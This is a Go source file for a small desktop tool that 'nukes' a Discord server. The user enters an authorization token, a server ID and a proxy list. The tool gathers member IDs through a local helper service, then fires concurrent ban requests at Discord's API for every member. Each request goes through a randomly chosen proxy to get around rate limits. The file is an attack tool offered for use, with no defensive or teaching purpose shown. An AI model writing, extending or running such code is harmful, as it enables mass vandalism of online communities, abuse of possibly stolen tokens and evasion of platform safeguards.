package main

import (
	"fmt"
	"fyne.io/fyne"
	"fyne.io/fyne/app"
	"fyne.io/fyne/container"
	"fyne.io/fyne/widget"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

var (
	mIds []string
	proxies []string
)

func main() {
	var a = app.New()
	var w = a.NewWindow("Hello")

	w.Resize(fyne.NewSize(500, 300))
	w.CenterOnScreen()

	var token = widget.Entry{PlaceHolder: "Token to ban with"}
	var serverId = widget.Entry{PlaceHolder: "Server ID to nuke"}
	var proxyPath = widget.Entry{PlaceHolder: "Relative or full path to proxy file"}
	var info = widget.Label{Alignment: fyne.TextAlignCenter}
	info.Hide()

	w.SetContent(container.NewVBox(
		&token,
		&serverId,
		&proxyPath,
		widget.NewButton("Load Proxies", func () {
			var byt, err = ioutil.ReadFile(proxyPath.Text)
			if err == nil {
				proxies = strings.Split(string(byt), "\n")
			}
		}),
		widget.NewButton("Grab Members", func() {
			var client http.Client
			// #Change API url
			var req, err = http.NewRequest("GET", fmt.Sprintf("http://localhost:2525/getmem?id=%v&token=%v", serverId.Text, token.Text), nil)

			if err == nil {
				var res, err = client.Do(req)

				if err == nil {
					var bod, err = ioutil.ReadAll(res.Body)

					if err == nil {
						mIds = strings.Split(string(bod), "<br>")

						if len(mIds) > 0 && len(proxies) > 0 {
							info.SetText(fmt.Sprintf("%v members | %v proxies", len(mIds), len(proxies)))
							info.Refresh()
							info.Show()
						}
					}
				}
			}
		}),
		&info,
		widget.NewButton("Ban All", func() {
			var wg sync.WaitGroup

			concGoRoutines := make(chan struct{}, 35)

			for i := 0; i < len(mIds); i++ {
				wg.Add(1)
				go func(memId string) {
					defer wg.Done()
					concGoRoutines <- struct{}{}
					banUser(memId, token.Text, serverId.Text)
					<-concGoRoutines
				}(mIds[i])
			}

			wg.Wait()
		}),
	))

	w.ShowAndRun()
}

func banUser(memId, tkn, serverId string) {
	rand.Seed(time.Now().UTC().UnixNano())

	var client http.Client
	var proxyUrl, _ = url.Parse(proxies[rand.Intn(len(proxies))])

	client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}

	var req, err = http.NewRequest("PUT", fmt.Sprintf("https://discord.com/api/v8/guilds/%v/bans/%v", serverId, memId), nil)

	if err == nil {
		req.Header.Set("Authorization", tkn)
		_, _ = client.Do(req)
	}
}
